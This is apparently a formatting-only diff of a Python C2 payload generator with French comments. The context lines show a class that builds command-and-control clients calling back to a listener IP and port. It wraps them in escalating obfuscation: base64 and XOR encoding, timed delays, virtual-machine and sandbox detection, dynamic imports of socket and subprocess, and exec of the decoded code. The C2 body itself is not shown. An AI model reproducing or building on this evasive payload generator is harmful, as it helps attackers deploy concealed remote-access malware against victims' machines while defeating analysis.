@@ -18,12 +18,14 @@ from typing import Tuple
 
 class C2PayloadGenerator:
     """Génère des payloads C2 complets avec toutes les fonctionnalités"""
-    
-    def __init__(self, listener_ip: str, listener_port: int, obfuscation_level: int = 2):
+
+    def __init__(
+        self, listener_ip: str, listener_port: int, obfuscation_level: int = 2
+    ):
         self.listener_ip = listener_ip
         self.listener_port = listener_port
         self.obfuscation_level = obfuscation_level
-    
+
     def get_full_c2_code(self) -> str:
         """Code C2 complet avec toutes les fonctionnalités"""
         return f'''
@@ -217,40 +219,40 @@ if __name__ == '__main__':
     client = C2Client('{self.listener_ip}', {self.listener_port})
     client.run()
 '''
-    
+
     def obfuscate_level_1(self, code: str) -> str:
         """Niveau 1: Base64"""
         encoded = base64.b64encode(code.encode()).decode()
-        return f'''
+        return f"""
 import base64
 code = base64.b64decode('{encoded}').decode()
 exec(code)
-'''
-    
+"""
+
     def obfuscate_level_2(self, code: str) -> str:
         """Niveau 2: XOR + Base64 + Délais"""
         key = random.randint(1, 255)
-        xored = ''.join(chr(ord(c) ^ key) for c in code)
+        xored = "".join(chr(ord(c) ^ key) for c in code)
         encoded = base64.b64encode(xored.encode()).decode()
         delay = random.randint(1, 3)
-        
-        return f'''
+
+        return f"""
 import base64, time
 time.sleep({delay})
 key = {key}
 xored = base64.b64decode('{encoded}').decode('latin1')
 code = ''.join(chr(ord(c) ^ key) for c in xored)
 exec(code)
-'''
-    
+"""
+
     def obfuscate_level_3(self, code: str) -> str:
         """Niveau 3: Sandbox Detection"""
         key = random.randint(1, 255)
-        xored = ''.join(chr(ord(c) ^ key) for c in code)
+        xored = "".join(chr(ord(c) ^ key) for c in code)
         encoded = base64.b64encode(xored.encode()).decode()
         delay = random.randint(5, 15)
-        
-        return f'''
+
+        return f"""
 import base64, time, os, sys
 def is_sandboxed():
     sandbox_indicators = ["VBoxService", "VBoxTray", "vmtoolsd", "qemu-ga", "sandbox", "virtualbox"]
@@ -267,16 +269,16 @@ key = {key}
 xored = base64.b64decode('{encoded}').decode('latin1')
 code = ''.join(chr(ord(c) ^ key) for c in xored)
 exec(code)
-'''
-    
+"""
+
     def obfuscate_level_4(self, code: str) -> str:
         """Niveau 4: Dynamic Imports"""
         key = random.randint(1, 255)
-        xored = ''.join(chr(ord(c) ^ key) for c in code)
+        xored = "".join(chr(ord(c) ^ key) for c in code)
         encoded = base64.b64encode(xored.encode()).decode()
         delay = random.randint(5, 15)
-        
-        return f'''
+
+        return f"""
 import base64, time, sys
 socket_module = __import__('socket')
 subprocess_module = __import__('subprocess')
@@ -286,16 +288,16 @@ key = {key}
 xored = base64.b64decode('{encoded}').decode('latin1')
 code = ''.join(chr(ord(c) ^ key) for c in xored)
 exec(code)
-'''
-    
+"""
+
     def obfuscate_level_5(self, code: str) -> str:
         """Niveau 5: MAXIMUM"""
         key = random.randint(1, 255)
-        xored = ''.join(chr(ord(c) ^ key) for c in code)
+        xored = "".join(chr(ord(c) ^ key) for c in code)
         encoded = base64.b64encode(xored.encode()).decode()
         delay = random.randint(60, 300)
-        
-        return f'''
+
+        return f"""
 import base64, time, sys, os
 def extreme_check():
     try:
@@ -312,12 +314,12 @@ key = {key}
 xored = base64.b64decode('{encoded}').decode('latin1')
 code = ''.join(chr(ord(c) ^ key) for c in xored)
 exec(code)
-'''
-    
+"""
+
     def generate(self) -> str:
         """Génère le payload obfusqué"""
         code = self.get_full_c2_code()
-        
+
         if self.obfuscation_level == 1:
             return self.obfuscate_level_1(code)
         elif self.obfuscation_level == 2:
